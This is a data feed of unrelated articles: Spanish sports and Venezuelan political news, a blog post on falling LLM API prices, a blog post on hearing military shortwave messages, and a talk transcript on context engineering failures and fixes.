articles.content:
El 21 de octubre de 2007, Kimi Raikkonen sacó tajada de la guerra civil que estalló en McLaren entre Fernando Alonso y Lewis Hamilton, para proclamarse campeón del mundo y encumbrar a Ferrari solo tres años después del último título, logrado por Michael Schumacher. Cuando el Hombre de Hielo cruzó la meta en Interlagos como ganador, y Chris Dyer, su ingeniero de pista, le soltó por la radio un mensaje que se ha convertido en icónico —“Según mis cálculos, eres campeón del mundo por un punto”, le comunicó el británico—, otro Kimi daba sus primeros pasos en casa de los Antonelli, en Bolonia, una ciudad universitaria que se encuentra en la Emilia Romagna, al norte de Italia, en un área bautizada como Valle del Motor’, por la industria que prolifera en la zona y que concentra marcas como Ferrari, Lamborghini o Pagani. Marco, el padre de la criatura, corría con turismos y pronto le contagió a su hijo el virus de la velocidad. Apenas 19 años después, el chaval tiene a su alcance este domingo (21:00 horas, Dazn), en Austin, la primera oportunidad de destripar uno de los récords más llamativos que existen en cualquier disciplina deportiva, también en la Fórmula 1: el de convertirse en el campeón más joven de siempre.

articles.title: Barcelona - Real Madrid en directo | Mbappé marca el segundo para volver a poner por delante al Madrid
articles.snippet: El Real Madrid está ganando al Barcelona este domingo en el primer clásico de la temporada . En un primer tiempo sin muchas ocasiones, el Barça fue quien tuvo el control de la posesión ante un equipo
articles.content: El Real Madrid está ganando al Barcelona este domingo en el primer clásico de la temporada. En un primer tiempo sin muchas ocasiones, el Barça fue quien tuvo el control de la posesión ante un equipo blanco muy bien plantado en defensa y que buscaba salir a la contra. Se dieron oportunidades para que el conjunto de Mourinho pudiera correr, pero las imprecisiones abundaron en los primeros 45 minutos. Algo que también se vio en los azulgrana. Raphinha tuvo un par de disparos que se le marcharon desviados y Lunin repelió un disparo de Gordon. Mbappé tuvo la más clara para los blancos tras rematar de volea un centro de Güler, pero también la mando fuera. Sin embargo, poco antes del descanso, un centro de Diomande lo despejó Gerard Martín, el balón pegó en Mbappé que andaba cerca de la jugada y pelota acabó dentro. Tras el descanso el Barça se volcó en ataque y el Madrid amenazaba a la contra, pero Raphinha igualó el encuentro con un disparo al segundo palo tras recibir un balón de Pedri en el área. Los de Flick, líderes con seis puntos por encima de los blancos, reciben al equipo de Mourinho, que no puede caer esta noche en el Camp Nou si no quiere descolgarse de la lucha por la Liga desde bien temprano.

articles.title: OpenAI and Anthropic cut their LLM prices by up to 80% within a few months. Why?
articles.snippet: Article URL: https://minimaxir.com/2026/10/cheap-llms/ Comments URL: https://news.ycombinator.com/item?id=50236102 Points: 11 # Comments: 4
articles.content:
OpenAI and Anthropic cut their LLM prices by up to 80% within a few months. Why?

October 25, 2026 · 12 min

Let’s look at a quick timeline of the major LLM model announcements from both OpenAI and Anthropic over the past few months. All pricing numbers provided are input MTok / output MTok / cache read MTok.

June 26, 2026#

OpenAI announced GPT-5.6 Sol and Luna. Sol is the direct successor to GPT 5.5 at the same price of $5 / $30 / $0.50, while Luna is a small model specifically designed for cheaper use cases at $1 / $6 / $0.10. They also announced a Terra model that’s in between those two models, but few cared about it.

June 30, 2026#

Anthropic announced Claude Sonnet 5, which Anthropic claimed to be closer to their Opus models, but feedback was mixed. Notably, it had launch pricing of $2 / $10 / $0.20 which was initially supposed to be temporary but would go up.

July 24, 2026#

Anthropic announced Claude Opus 5, which was a long-awaited major-version update given the impact Opus 4.5 had on the rise of agentic coding, at a price of $5 / $25 / $0.50 (similar to GPT-5.6 Sol). Although some of the provided benchmark results surprisingly exceeded those of the much larger Fable 5, real-world feedback was more mixed.

July 30, 2026#

OpenAI announces that they cut the price of GPT-5.6 Luna by 80% (???) to $0.20 / $1.20 / $0.02.

August 10, 2026#

Anthropic announces the temporary Sonnet 5 price cut for the launch is now permanent.

August 21, 2026#

OpenAI announces that they are cutting the price for GPT-5.6 Sol by ~20% ($4 / $20 / $0.40) for the next three months.

September 1, 2026#

Anthropic announced Fable 5.1 at a price of $10 / $50 / $0.25, which, in addition to having strictly better benchmark performance in all areas than Fable 5 from June at $10 / $50 / $1, cut the cache read cost by 75%.

Cache read costs

When using agents for coding, cache read costs are the vast majority (96% - 99%) of the total token expenditure as the cache is what contains the entire previous conversation each turn. Additionally, the cache tends to be hit around 90 - 100% of the time (varies by the infrastructure of the LLM inference provider). Taken together, a 75% reduction in the cache read cost correlates to a 70-75% reduction in the cost of using the model—obviously notable, even if cache costs are typically a footnote!

September 3, 2026#

OpenAI announced GPT-6 Astra, which is similar in size to Fable 5.1 and has similar pricing at $10 / $50 / $1 but without the lower cache read cost. Astra’s model performance is indeed comparable to Fable.

September 22, 2026#

OpenAI announced GPT-6 Sol at at a shocking price of $2 / $10 / $0.20 that halves the input and output price relative to the temporarily-discounted GPT-5.6 Sol! They simultaneously released GPT-6 Luna also at half the input and output price ($0.10 / $0.50 / $0.01) of the previous version.

On the same exact day, Anthropic announced Claude Opus 5.5, where it’s explicitly stated “Opus 5.5 requires less compute to serve than Opus 5, and its pricing reflects that”. Its price of $4 / $20 / $0.20 is much lower in total than Opus 5’s due to a 20% input/output cost cut and a larger cache read cut, resulting in a total cost reduction of 40-60% for a model that’s even better than Fable 5.1 (I have quite a lot of things to say about Opus 5.5, but that’s for another post).

September 29, 2026#

It turned out that GPT-6 Sol was a dud performancewise, so a week later OpenAI announced GPT-6.1 Sol, which surprisingly has comparable performance to Astra (can confirm after personal use), but OpenAI casually cut the cache price in half ($2 / $10 / $0.10) matching Anthropic’s 5%-of-input cache read cost, making this model family cumulatively 75% cheaper.

Overall, starting from the release of the GPT-5.6 model families in June to now, the cost of using these popular LLMs has cratered, which is not something I would have expected a year ago. These price cuts also apply to model usage from subscription agentic harnesses such as Codex and Claude Code. More importantly, these models do not appear to have cut any corners in terms of output quality to achieve their price cuts.

From the timeline above, there is a clear tit-for-tat between Anthropic and OpenAI, and it is reasonable to assume that these particular price cuts from OpenAI and Anthropic are in reaction to each other. However, no one cuts prices by 80% unless there is some externality in play. So, what gives?

The Behavioral Economics of LLMs and Competitor Pricing Pressure#

If you have been testing agents with new LLMs as they are released, it can be very difficult to differentiate them outside of subjective vibes. Since last November that launched the hypergrowth of agentic LLMs, models have become more of a commodity where it’s trivial to try a new model on your codebase with just a toggle in a harness like OpenCode and Zed Agent, or a different API endpoint string through OpenRouter, and as a result there is little moat. Additionally, there are many competitors—not just large companies like Google and Meta—who can provide models which are sufficient substitutes and therefore allow pricing pressure.

For open weight models, let’s take another look at DeepSeek Flash V4.1, which also recently released an updated 1017 variant.

The original DeepSeek V4 Flash 0420 was released in April 2026 at a price of $0.14 / $0.28 / $0.0028 and went megaviral as a result, especially as OpenAI didn’t have a small-class model for simple tasks at the time. That $0.0028 turned out to be the key, as a cache read proportion of 2% is substantially lower than the 5%-10% of the OpenAI and Anthropic models above, which makes the effective cost even lower than what is advertised. I suspect the 80% GPT-5.6 Luna price cut in July was meant to specifically compete with these smaller open-weight models. Now, the new DeepSeek Flash V4.1 1017 model performs significantly better than DeepSeek Flash V4 benchmark-wise (45 on the Artificial Analysis index vs. 24) and the cost from DeepSeek remains similar at $0.15 / $0.60 / $0.003. Note the operative words “from DeepSeek”.

On OpenRouter, any inference provider can list a model that they host, and when a user hits the OpenRouter API, the request is routed to one of those models—it’s routed to any available model by default for load balancing but the developer can specify preferences such as “lowest price” in the API request. Back in May, I noted that there were 13 distinct providers hosting DeepSeek V4 Flash on OpenRouter. For the updated 1017 variant, there are now 29 distinct providers.

However, looking at the effective input costs (which account for the interaction between cache read costs and cache hit rates), many distinct providers are close costwise.

OpenAI and Anthropic will have to differentiate from these open weight models with higher-quality models—they are currently doing a good job with that particularly with Opus 5.5—but they need to keep doing that, which is why billions of dollars are being invested into R&D. Open-weight models are catching up fast: just a few days ago, Moonshot AI announced Kimi K3.1 Pro which has comparable performance to Opus 5.5 (Kimi at 55 vs. Opus 5.5 at 58) at half the input/output price and the same cache read cost ($2 / $10 / $0.20). It’s the same size and architecture as Kimi K3 which is currently being hosted by over 20 distinct inference providers: once the weights drop on November 4th, you can therefore expect most of them to support the new Kimi K3.1 Pro model at a roughly equivalent price. Notably, Moonshot AI itself is joining the price cut fun and priced Kimi K3.1 Pro at less than the original Kimi K3 ($3 / $15 / $0.30).

One recurring trend among vocal AI detractors is that the price of tokens has been kept artificially low to hook people into the LLM ecosystem, but then the prices will increase to “the true cost of a token” and the AI boosters will be screwed once the free ride ends. The theory is that OpenAI and Anthropic are loss-leading just like what Uber and Lyft did to the ridesharing industry in the 2010s, but unlike then, OpenAI and Anthropic are not a duopoly who have the sole power to set prices in the ecosystem and the barrier to entry for the inference industry is not as high. As long as these many inference providers can continue to serve models at a similar price and a similar quality to what OpenAI and Anthropic can provide, and switching cost is negligible, then the prices may continue to decrease more. It’s no surprise both companies are trying to build moats to defend against this trend, such as a focus on enterprise commitments and personal agentic assistants like OpenAI Dots and Claude Duet.

The idea that token prices will suddenly rise is more a fantasy that is not supported by both behavioral economics and the actual trends of LLM prices going down significantly over the last few months for better models, and not just from OpenAI and Anthropic. As long as scalers can price at a cost-per-token lower than the revenue-per-token, then those inference providers will reduce token costs to compete with each other to a point that OpenAI/Anthropic will have to lower their prices to compete too. The 29 distinct providers on OpenRouter have little incentive to serve an unprofitable model (they would just stop serving it and use the compute capacity for a profitable model instead) and “the true cost of a token” may end up being where price equals marginal cost.

On that note, both OpenAI and Anthropic are indeed close to IPOing, which raises further questions about the price cuts.

IPO Pumping#

The timing of these price cuts is notable because both OpenAI and Anthropic are rumored to be IPOing soon—OpenAI in 2027, and Anthropic within a couple months. So far, leaked financials from both OpenAI and Anthropic show unsurprisingly that they are losing billions due to R&D/scaling, albeit in both cases these reports do not account for the hyperexpansion of agentic LLM use over the past few months. Investors will scrutinize the massive negative profits and demand that they have a plan to turn things back around.

So, why did they cut their primary revenue source by up to 80%? That’s the opposite of what you would want to do to look good on an S-1 prospectus! The profit margins on inference themselves likely tell a different story, with some reports saying the profit-per-token margins are as healthy as 80% with caveats. How much of a profit margin do they have after these major cuts?

Speaking personally, the price cuts have indeed affected how I spend on LLM agents, but not in the way I expect OpenAI/Anthropic want their typical customer to behave. I used to have a $100/month subscription to Codex (the 5x Pro plan) when GPT-5.6 Sol was the top model, and I managed to just fully exhaust all the usage included in the subscription despite getting annoyed with random usage resets. Once GPT-6.1 Sol released and I noticed that the cost of using it was effectively cut by 75%, you know what I did?

I cut the max usage quota to 1/5th after getting 4x more efficient usage of the same model, so it ends up roughly neutral and the obvious choice.

In fairness, the profit margins for subscriptions such as Claude Code and Codex are uncertain given their immense value relative to the API usage, and if there are capital crunches I suspect subscription value will be cut before the base price of the models. For example, at the same time GPT-6.1 Sol was announced, OpenAI cut the usage allowance by 50% for the $200/month tier in Codex under the argument “to reflect our increasingly efficient models”—which is technically correct but it’s funny to put in writing.

I will be very curious to see the Anthropic IPO prospectus and the inference profit margins once it becomes public soon.

I also question whether it’s good for OpenAI/Anthropic if they intentionally obsolete their more expensive models. After Opus 5.5 released a month ago, there hasn’t been any discussion about either Fable 5.1 or GPT-6 Astra because Opus 5.5 is just that good.

I fully expect a Fable 5.2/GPT-6.1 Astra to release in a couple weeks and prove me wrong, and I will be very curious to see how it will be priced.

Another less-cynical factor that could explain the price cuts is that LLM infrastructure has improved over the past few months—when Anthropic said “Opus 5.5 requires less compute to serve than Opus 5, and its pricing reflects that,” I believe it. One outcome that would be genuinely ironic is that if these models are more compute efficient, it reduces the need for these massive data center buildouts, which could cause cascading economic failures. However, that likely won’t happen since inference is only one part of the compute mix and those data centers are still needed for other parts of the pipeline.

Overall, the price cut is weird, but as a user I’m certainly not complaining! Open-weight models and secondary inference providers will continue to serve as an economic check on the prices of LLMs and other business shenanigans the large labs may concoct. Even if Anthropic’s and OpenAI’s IPOs are catastrophic and cause both companies to fold, it will not suddenly cause LLMs and agents as an industry to die.

  • Max Woolf (@minimaxir) is formerly a Senior Data Scientist at BuzzFeed in San Francisco who works with AI/ML tools and open source projects. Max’s projects are funded by his Patreon.

articles.content:
Mensajes cifrados para las fuerzas nucleares, muy a lo «Juegos de guerra», que pueden escucharse por radio de onda corta

Por @Alvy — 25 de Octubre de 2026

No sabía yo que esto era tan público, pero es una de esas cosas altamente frikis, que cualquiera puede hacer y que molan. Se puede experimentar en Missileer Watch, una web que sirve para escuchar en directo las transmisiones por onda corta del sistema de comunicaciones militares estadounidense HFGCS, que emite en 11.175 kHz. Entre esas comunicaciones están los Emergency Action Messages (EAM), mensajes codificados que pueden transmitir órdenes militares de emergencia del mando nuclear. Así, como suena.

La web graba esos mensajes emitidos por radio, intenta transcribir las letras y números mediante un sistema Speech-to-Text y luego permite volver a escucharlo, e incluso proponer corregir las transcripciones si crees que están mal. [Nota: a veces la reproducción de mensajes no funciona muy allá.] Pero, ¡quieto vaquero! Nadie ajeno al sistema puede descifrar su contenido: oír un mensaje no significa saber qué orden secreta contiene, ni que vaya a comenzar la Tercera Guerra Mundial. Y seguramente la mayoría serán pruebas de rutina.

Esto mismo lo podrías hacer con cualquier receptor de radio de onda corta, entre ellos mi acompañante favorito del escritorio, el XHDATA D-808, uno de los mejores gadgets que haya comprado jamás: fiable, duradero y sumamente interese para descubrir cosas (lo uso ocasionalmente para escuchar la frecuencia de las torres de control de los aeropuertos). El método para intentar pillar los EAM según se emiten:

  1. Encender la radio y extender completamente la antena.
  2. Pulsar SW (onda corta).
  3. Pulsar FREQ.
  4. Teclear 11175 (sin coma ni punto) que es la frecuencia, 11.175 kHz.
  5. Pulsar SSB (activar recepción en banda lateral única).
  6. Pulsar INFO hasta que aparezca USB (banda lateral superior).

La mayor parte del tiempo (y esto son muchas horas al día) sólo se escucha ruido blanco. Pero se emiten unos cuantos a lo largo del día. Por suerte en la web se pueden revisar los mensajes recientes para entender cómo va la cosa. Hay mensajes parciales, otros un poco ininteligibles… En fin, es como funcionan estas cosas: dejarlo como ruido de fondo y de vez en cuando se escucharán cosas. Cosas importantes (supuestamente).

Una historia rocambolesca, a lo «War Games»

Lo mejor de Missileer Watch es tal vez la historia de su creación. Es la de un tal Daniel Frenkel, que fue operador entre 2012 y 2016 del 321.º Escuadrón de Misiles en la base F. E. Warren, en Wyoming.

Con apenas 23 años le confiaron una responsabilidad peculiar: hacer guardias de 24 horas en un silo subterráneo desde el que dos oficiales podían participar en el lanzamiento de misiles intercontinentales Minuteman III. Dice que odiaba la rutina de aquel trabajo: años de entrenamiento para pasar el tiempo esperando que no ocurriera nada, aburrido, cansado o estresado.

De aquella época cuenta que se queda con los amigos que hizo, la sensación de responsabilidad y las tres suculentas comidas que les servían al día… teniendo en cuenta que era un silo. Todo muy Juegos de guerra… mono de trabajo incluido. Nuevamente, ojocuidao: no sabemos si esta historia será cierta o por qué es todo público si se supone que esos asuntos son más bien confidenciales (?!)

La ironía del asunto es que, según cuenta, durante aquellos cuatro años nunca escuchó un EAM en voz alta. Ya como civil descubrió que esos mensajes circulaban en abierto por las ondas en todas partes del mundo y que podían recibirse con una radio de onda corta cualquiera, o a través de un navegador en internet. Y así es como nació esta web, que ofrece explicaciones sobre esos silos de lanzamiento, mapas de instalaciones y aviones estratégicos observados mediante señales públicas, al estilo FlightRadar24.

El caso es que antes Frenkel esperaba bajo tierra deseando que no llegara ninguna orden «complicada de cumplir». Ahora se dedica a escuchar, desde fuera, lo mismo que en aquellas largas esperas en las que no sucedía nada. Seguramente es mejor así, aunque también seguro que habrá alguien ocupando su puesto. Incluso, quien sabe, tal vez haya algún WOPR ya instalado y funcionado por ahí.

articles.title: El regreso de María Corina Machado a Venezuela, en vivo | María Corina Machado hará tres paradas en su camino hacia Caracas
articles.snippet: Después de casi 10 meses fuera del país, María Corina Machado, líder de la oposición antichavista y Premio Nobel de la Paz, ha regresado este domingo a Venezuela. “Estoy aquí, con ustedes”, ha escrito
articles.content:
Después de casi 10 meses fuera del país, María Corina Machado, líder de la oposición antichavista y Premio Nobel de la Paz, ha regresado este domingo a Venezuela. “Estoy aquí, con ustedes”, ha escrito en sus redes sociales la dirigente opositora. El presidente de Estados Unidos, Donald Trump, ha dicho que Machado es “muy agradable” y espera que “esté a salvo”. El secretario de Estado, Marco Rubio, el funcionario de Trump más involucrado en la cuestión venezolana, ha defendido, por su parte, que el regreso de la líder opositora fue posible gracias a las negociaciones tuteladas por la Casa Blanca entre el chavismo y la oposición. La vuelta de la opositora es un desafío abierto al chavismo y también a Estados Unidos, que ha mantenido a Machado al margen de las negociaciones por una transición democrática en Caracas.

articles.title: María Corina Machado regresa a casa, pero su misión no ha terminado
articles.snippet: El fin de la odisea de Machado es una buena noticia, porque promete un reseteo de la política en Venezuela y puede recargar de energía y dinamismo un proceso de transición centrado alrededor de una me
articles.content:
El fin de la odisea de Machado es una buena noticia, porque promete un reseteo de la política en Venezuela y puede recargar de energía y dinamismo un proceso de transición centrado alrededor de una mesa de negociación que padece tres graves problemas: no representa el sentimiento popular, está micromanejada desde Washington por Marco Rubio y ha ralentizado el cambio de régimen mediante un proceso opaco y burocrático. Pero ni ella ni nadie debe engañarse: del mismo modo que haber regresado a Ítaca no significó el fin de la misión de Ulises, el regreso a Venezuela tampoco implica el fin de la misión de Machado. Se trata, acaso, del principio de una nueva etapa en la que tendrá que hilar más fino de lo que lo ha venido haciendo desde el 3 de enero, cuando, tras la extracción de Maduro, una jugarreta de Trump la dejó fuera de la transición democrática del país que Machado se preparaba para comandar como protagonista.

articles.content:
El regreso de María Corina Machado era una cuestión de vida o muerte política. La opositora es la dirigente mejor valorada de Venezuela, pero se precipitaba hacia la irrelevancia mientras la negociación con el chavismo avanzaba sin ella. Tenía dos salidas, y ninguna era buena. Podía esperar la luz verde de Washington y seguir la transición por televisión, o forzar un retorno que había prometido tantas veces que empezaba a poner en riesgo su credibilidad. Ha elegido, o le han permitido, lo segundo. Con su vuelta resuelve el problema de la distancia. El del tiempo, ahora mismo, lo controlan otros.

María Corina Machado llegó a Venezuela. La noticia se propagó rápidamente por los grupos de WhatsApp. Primero lo anunció ella misma en su cuenta de X: “Estoy aquí con ustedes”. Poco después, Edmundo González Urrutia, exiliado en España, confirmó la información y aseguró que él también regresará pronto al país. Tras la conmoción inicial surgió la pregunta inevitable: ¿qué viene ahora?

Se trata del noveno intento de la líder opositora por regresar a Venezuela. Temprano este domingo, miembros de su equipo recibieron un mensaje de Magalli Meda, jefa de campaña de Machado, informándoles que el retorno ya se había concretado. María Corina se preparaba para asistir a una misa en una iglesia de Barquisimeto, en el centro del país, cuando comenzó a circular la noticia. Meda describió el regreso como una operación compleja y advirtió que ahora empiezan nuevos desafíos. Son varios.

El primero será mantener el respaldo popular que, al menos en las primeras horas, se hizo evidente en las manifestaciones de entusiasmo registradas a lo largo del recorrido terrestre que emprendió hacia Caracas. El segundo, quizá más delicado, consiste en gestionar su ya tensa relación con Estados Unidos, un aliado al que ha pedido públicamente acelerar las acciones necesarias para propiciar un cambio político real en Venezuela.

Durante su ausencia forzada, Machado ha conservado niveles muy altos de popularidad. Un estudio reciente de la firma Poder y Estrategia le atribuye una intención de voto cercana al 70%. Sin embargo, nada indica que en el corto plazo vaya a celebrarse una elección presidencial en el país sudamericano.

La semana previa a su retorno concluyó la tercera ronda de conversaciones entre el gobierno encabezado por Delcy Rodríguez y un sector de la oposición representado por los remanentes de la Asamblea Nacional electa en 2015, liderados por Dinorah Figuera. Al cierre de la ronda, Figuera y Rodríguez se reunieron públicamente por primera vez, un hecho que alimentó rumores sobre un posible encuentro con Machado. Hasta ahora, no pasan de ser especulaciones.

La Mesa de Acuerdo avanzó hacia uno de sus objetivos: la renovación del Tribunal Supremo de Justicia. A cambio de las concesiones realizadas, el gobierno de Rodríguez continúa exigiendo el levantamiento total de las sanciones internacionales. Entre las demandas planteadas en la negociación figura la devolución de cuatro mil millones de dólares en oro bajo custodia del Reino Unido. No está claro si esa solicitud ya fue atendida ni si forma parte de los acuerdos alcanzados hasta ahora, ya que, como otros aspectos de la negociación, no ha sido informada oficialmente.

Ricardo Ríos, director de Poder y Estrategia, señala dos interrogantes centrales sobre el futuro inmediato de Machado. La primera tiene que ver con el grado de libertad de movimiento y acción política que podrá ejercer dentro de Venezuela, especialmente si su retorno estuvo sujeto a condiciones negociadas. La segunda apunta a los costos políticos que podría enfrentar en los próximos meses si las expectativas de cambio terminan frustradas. “Ha hecho una jugada audaz que mueve el tablero, pero no debe estar sola en esta decisión”, afirma.

También sigue siendo una incógnita el papel desempeñado por Estados Unidos en este retorno. Sin embargo, existe consenso entre distintos actores políticos sobre un hecho: Washington no obstaculizó el regreso de Machado, como algunos presumían que había ocurrido en los ocho intentos anteriores.

El secretario de Estado, Marco Rubio, saludó el reingreso de la dirigente opositora en términos que reflejan cierto malestar por las críticas recibidas desde sectores de la oposición:

“Las condiciones que permiten el regreso seguro de la Sra. Machado a Venezuela son el resultado directo de las conversaciones de reconciliación apoyadas por Estados Unidos, que ya han logrado la liberación de cientos de presos políticos y el retorno del exilio de cientos de figuras de la oposición política”.

Rubio instó además a que continúe el respeto a las libertades de todos los sectores políticos.

“Esperamos que todos los actores políticos apoyen estas conversaciones, que representan la mejor oportunidad que Venezuela ha tenido en treinta años para lograr pacíficamente no solo una elección libre y justa, sino una democracia duradera”.

Machado había incrementado la presión pública mediante artículos y entrevistas publicados en The New York Post, The New York Times y Fox News. En esos espacios procuró matizar sus diferencias con Washington: elogió el papel del presidente Donald Trump en la salida de Nicolás Maduro el pasado 3 de enero, pero cuestionó que gran parte de la estructura de poder del antiguo régimen continúe administrando el Estado y participando en los negocios petroleros.

El jueves 23 de octubre, además, cientos de simpatizantes se movilizaron en distintas ciudades para exigir que se facilitara su regreso al país.

Uno de los temores que se expresan en voz baja, tanto dentro como fuera del oficialismo, es que Machado logre capitalizar el creciente descontento social. La frustración no solo responde a la ausencia de mejoras económicas, aún inalcanzables, para la mayoría de la población, sino también a la percepción de que persisten prácticas de corrupción alrededor de los acuerdos políticos y económicos impulsados por ambos gobiernos, como ha señalado el economista Ricardo Hausmann.

Por ahora, el regreso de María Corina Machado altera el clima político en un tablero que comenzaba a estabilizarse y que lucía predecible. Sin embargo, aún no cuenta con capacidad de incidencia directa en la mesa de negociaciones donde hoy se ejecutan las decisiones más relevantes, bajo la tutela de Estados Unidos.

Su principal reto es cómo transformar el enorme capital político que ha construido en los últimos tres años en un movimiento que no se agote ante tantos intentos frustrados de lograr un verdadero cambio. Le corresponde reencontrarse con sus seguidores, reconstruir espacios de acción y, al mismo tiempo, administrar con habilidad una relación compleja con un aliado indispensable que ha preferido jugar cerrado con su némesis.

Oct 24, 2026

CONTEXT ENGINEERING PRESENTATION

The State of Context Engineering

The Job is Knowing When to Be Deterministic & When to Be Probabilistic

This week, I gave a short talk at AGNTCon titled, “Context Fails & Fixes,” that functioned as a sort of “State of Context Engineering.” How did context engineering emerge, where has it gone, and where might it go in the future? As model makers target new capabilities, they inadvertently create challenges we, as users and harness builders, must overcome.

Below are the slides and a lightly edited transcript. As always, shoot me a note with any feedback, thoughts, or questions. I really appreciate it.

Hi, everyone. Thanks for joining me today. We’re going to walk through context fails and fixes.

I have a book coming out in a bit, The Context Engineering Handbook. When I first talked to the team at O’Reilly, back in June 2025, they asked me a very reasonable question: “How do we know this won’t become obsolete in a few weeks?” The trouble with AI textbooks is that many age extraordinarily quickly.

I said, I don’t know, but I’m optimistic. Giving clear instructions about what to do and what not to do, and ensuring those instructions are consistent and not noisy, will forever be a challenge with AI, no matter how good it gets.

We have coworkers, partners, and other people we know and interact with who are sentient. They pass the Turing test, they are “AGI,” and yet: we still have a hard time conveying instructions, ideas, and concepts among each other.

Context engineering will continue to be hard. But it will be hard in unique ways, because models aren’t people. You can make assumptions about how models think or interpret things (use whatever anthropomorphizing word you like), but it helps to understand how they’re built, optimized, and trained. Their unique attributes and construction create a unique set of failure modes we need to reckon with.

So let’s review how we got here.

Let’s flash back to the end of 2024.

If you remember, this was the height of the “RAG is dead” moment.

The hope was: if we can just make the context window large enough, we can put the entire internet in it. We can put everything in it. We don’t have to be selective. We don’t have to build agentic systems. We can fit it all in there, and AI will be solved.

Model builders started aiming at long context capabilities and we had a big leap from ~128,000-token context window models to million-token context window models, starting with Gemini 1.5.

If you look at the marketing material for Gemini 1.5 Pro, it was mostly about the million-token context window. They were even teasing a 10-million-token context window model they had in the lab, that would come out soon.

But they got beaten to the punch. Llama 4 Scout came out with a 10-million-token context window, and well, it wasn’t quite what we hoped. Inference was a challenge, and Scout never really caught on, and we never got another Llama.

But we still got a million tokens. That’s pretty good. We’ll take it.

So this was the brief at the time: just put everything in the context and let the model sort it out.

But with more context, we had room for more problems. Long contexts are not a panacea.

When I wrote about this, I identified four key failure modes.

Context poisoning is when something gets into the context that shouldn’t be there. It could be a hallucination or a bad fact, and the model can’t get past it.

Context distraction is when the context grows so long that the model starts to focus on the context over its base knowledge. We can see this in some really interesting ways.

Context confusion is when extraneous facts—things that don’t relate to the problem I’m working on—come in and influence the model in ways we don’t fully understand. This one’s really pernicious. We’re not going to dig into it today, but it’s one of my favorite failure modes. The model makes assumptions about who you are, and those assumptions influence the answer.

Finally, context clash is when tool calls, skills, and other information within your harness start to conflict and work against you in ways you didn’t expect.

(How many of you keep memory on in ChatGPT or Claude? I turn it off. I hate it. Sometimes I’m talking about work conversations; sometimes I’m talking about a project I’m doing with my son. The model will take notes on both, mix up those contexts, and the confusion grows from there.)

Let me give you my favorite example of context poisoning.

I’m going to date myself: I played the game on the left. The one from 1996, for the original Game Boy. This is the first Pokémon Red. It was in black and white.

In 2004, Nintendo released Pokémon FireRed for the Game Boy Advance. These were essentially the same game, except one had better colors and audio.

But there was one subtle change. At some point in both Pokémon Reds, to get past a security guard, you have to give them something to drink. A bribe. Quite the practical lesson for children.

In the original game, you need to give the thirsty guard lemonade. In FireRed, for some reason, they changed it to iced tea.

That created a problem for the agent. In the Gemini 2.5 technical report, the researchers described how they had the model play Pokémon. Researchers like Pokémon as an agent benchmark because it’s a reasonably controlled environment and doesn’t move particularly fast.

Several times, Gemini 2.5 became convinced it needed to get tea, even though it was playing the older game. The tea task for FireRed was in its weights, so it poisoned its context. It spent hours trying to find or give the guard tea. Once it had been added to its to-do list, the model could not get past it.

That’s context poisoning. And it happens all the time.

Another failure mode is context distraction. This is one of my favorite demonstrations, and the research came out after I wrote the original piece.

As your context gets longer, how does your behavior change? Quick question: how many of you, when you’re coding, let the context go all the way to a million tokens? Fill it all up?

(About half the room raised their hands!)

Wow, that’s more than I expected.

For me, around 200,000 or 300,000 is where I start looking. I’ll check, see it’s at 250,000, and think: I’ve got a big job coming up. I’m going to reset and start fresh. Let me show you why this matters.

Recently, I stumbled on a paper that wonderfully illustrates context distraction: Do as I Say, Not as I Do, by Carolina Camassa and Derek Shiller.

Their experiment is a little contrived, but it’s useful for thinking about how this happens. They give the model an instruction: “I want you to translate every question into Russian as your answer to each of my questions.” Then they present a bunch of examples that are counter to these instructions. In this case, many questions with answers in French.

These aren’t new instructions. They’re just examples sitting in the chat history.

Then they ask the model a question. Will it follow the instructions?

How often does the model respond in Russian, as it was instructed to, and how often does it respond in French, as it’s seen in the examples?

The x-axis on this matrix enumerates how many bad examples were present. The y-axis is the model being tested. The figures in the intersections are the percentage of times the model adheres to the instructions, rather than following the examples.

It turns out this affects every model! For smaller models, like Gemma 3 12B, after just a few contradictory examples, the model follows the instruction less than half the time. With Opus 4.6, which is an amazing model, it takes many more examples, but it happens there too.

Imagine you’re going back and forth on a front-end design, trying to tweak CSS and get a component exactly right. How many bad examples have you seeded in that exchange? Those examples start to influence the model. As your context grows, things fall apart.

Gemini 2.5 ran into this too, while playing Pokémon.

Remember, Google was really proud of its million-token context window. The paper suggested that two million tokens were around the corner. But buried in the appendix was this observation: once the context grew significantly beyond 100,000 tokens, the agent began repeating actions from its history instead of synthesizing new plans.

I’m convinced the marketing people never read the appendix. I love this technical report.

Long contexts let you fit in more information, but they also let you fit in more errors. Long contexts weren’t a panacea.

Thankfully, we’ve developed a pretty good toolbox. Surprisingly, even as new challenges have emerged (we’ll get to those in a minute), this set of tools has remained the same.

These six of them.

You have context augmentation: RAG, skills, and other ways to bring in the information relevant to the problem.

You have tool loadout: selecting which tools and skills to expose so you don’t overload the model. I was recently talking to an enterprise team whose agents had suddenly started performing terribly. We investigated and discovered their enterprise software was loading 600 skills for every engineer at startup. We figured they should probably filter those, with a loadout function.

Third is context quarantine: subagents and peer agents, where you start something with a blank history but let it work in the same environment.

Fourth is context pruning. Claude Code and Codex do this, sometimes without you even noticing. Early stages of compaction often strip out tool results you no longer need.

Fifth is context offloading: storing information in the environment, such as Markdown files or a database, so you can access it later.

And sixth is context summarization, which everyone knows as compaction.

These are the tools, and we’ve increasingly moved them into the harness.

Let’s look at an example harness, to show how simple these patterns are.

I’m really passionate about DSPy. I think it’s an incredibly readable and effective way to build AI workflows and agents. And it’s also a great language for simply specifying behavior, so it’s well suited to this demonstration.

An agent is a while loop. Here we’re using a ReAct module: we give it a request, we want a response, and we give it some tools. Those tools are just Python functions.

For this demo we have a big model (in this case, Claude opted for Claude Sonnet 4.5, good luck with that!). And I’m using a Jev as the small model: a tiny decision model that makes lightning-fast decisions. You could swap in a small LLM in this example, and everything would still work.

We have a while loop that takes input, sends it to ReAct, and carries the accruing history forward. This is an agent in about a dozen lines using DSPy. It would be even fewer if you took out the extra model.

How do we do tool loadout? It’s just a function.

We present Jev with the request and a tool, asking if it’s needed for this task.

Jev is fast enough that we can do this one tool at a time; it’ll be fine. We wrap this in a loadout function that iterates through all the tools and asks if each is needed, then returns the top-ranking subset. That’s it.

With context quarantine, it’s just a subagent. You expose an agent as a tool that the main agent can use, and it starts with a blank history.

With context pruning, we’re stepping through the history, passing each turn to Jev, and asking: is this still needed? If not, cut it.

You can be as rough or as elegant as you want here. Just mind your prompt caching.

We can also rewrite the history with compaction. Take the old turns, create a summary, and start the new context from that summary.
